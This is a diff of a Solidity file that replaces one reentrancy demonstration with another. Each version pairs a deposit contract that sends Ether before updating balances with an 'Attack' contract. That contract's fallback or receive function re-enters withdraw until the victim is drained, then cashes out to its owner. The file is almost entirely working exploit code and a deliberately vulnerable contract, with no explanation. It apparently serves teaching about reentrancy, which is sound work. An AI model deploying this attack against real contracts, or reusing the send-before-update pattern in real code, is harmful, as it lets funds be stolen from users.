@@ -1,82 +1,57 @@
-// SPDX-License-Identifier: MIT
-
+//"SPDX-License-Identifier: UNLICENSED"
 pragma solidity ^0.8.0;
 
-//Victima
-//Smart Contract de una cuenta de ahorra
-contract victim {
-  
-  //Balances
-  mapping(address => uint) public balances;
+contract DepositFunds{
+    mapping(address => uint) public balances;
+    
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
 
-  //Agregar Ether a mi cuenta. 
-  function donate() public payable {
-    balances[msg.sender] += msg.value;
-  }
-
-  //Consultar mi balance
-  function balanceOf() public view returns (uint balance) {
-    return address(this).balance;
-  }
-
-
-    //Retirar Ether de mi cuenta
-    function withdraw(uint _amount) public {
-
-    //Si mi balance es  mayor o gual que el valor que va a retirar, prosigue. 
-    require(balances[msg.sender] >= _amount, "Fondos insuficientes"); 
-
-      //Envía el valor solicitado 
-      (bool result,) = msg.sender.call{value:_amount}("");
-      
-      if(result) {
-        _amount;
+    function withdraw() public {
+        uint bal = balances[msg.sender];
+        require(bal > 0);
+        (bool sent, ) = msg.sender.call{value: bal}("");
+        if(sent) {
+        bal;
       }
+        balances[msg.sender] = 0;
+    }
 
-      //Actualiza el balance. 
-      balances[msg.sender] -= _amount;
-
-  }
-
+    function getTotalBalance () public view returns(uint256) {
+        return address(this).balance;
+    }
 }
 
-//Deposita Ether como trigger para el ataque
-
-//Hacker 
-contract attack{
-    
-    //Instanciar el contract victima
-    victim public victimContract; 
-
-    //Amount a retirar
-    uint256 public amount = 1 wei;
-
-    //Owner del contract atack
+contract Attack {
+    DepositFunds public depositFunds;
     address payable owner;
-
-    //Constructor. Recibe el address del contract victima. 
-    constructor(address _contracToAttack){
-        victimContract = victim(_contracToAttack);
+    constructor(address _depositFundsAddress) {
+        depositFunds = DepositFunds(_depositFundsAddress);
         owner = payable(msg.sender);
+        
     }
 
-    //Donar al contract victima. 
-    function donateToVictim() external payable{
-        victimContract.donate{value: msg.value}();
-    }
-    
-    //Receive es una función que se ejecutará cada que se envían Ether al contract 
-    //Y no se hayn especificado datos de llamada. 
-    receive() external payable{
-        //Que ejecute la función siempre y cuando aun haya balance
-        if(address(victimContract).balance != 0 wei){
-            victimContract.withdraw(amount);
+    // Fallback is called when DepositFunds sends wei to this contract.
+    fallback() external payable {
+        if (address(depositFunds).balance >= 1 wei) {
+            depositFunds.withdraw();
         }
-    } 
+    }
 
-    //Conocer el balance total de la address del atacante.
-    function getTotalBalance() public view returns (uint256){
+    function attack() external payable {
+        require(msg.value >= 1 wei, "Enviar mas valor");
+        depositFunds.deposit{value: msg.value}();
+        depositFunds.withdraw();
+    }
+
+    function getTotalBalance () public view returns(uint256) {
         return address(this).balance;
+    }
+
+    function cashOut () public payable{
+        uint256 balance =getTotalBalance();
+        owner.transfer(balance);
     }
 
 }
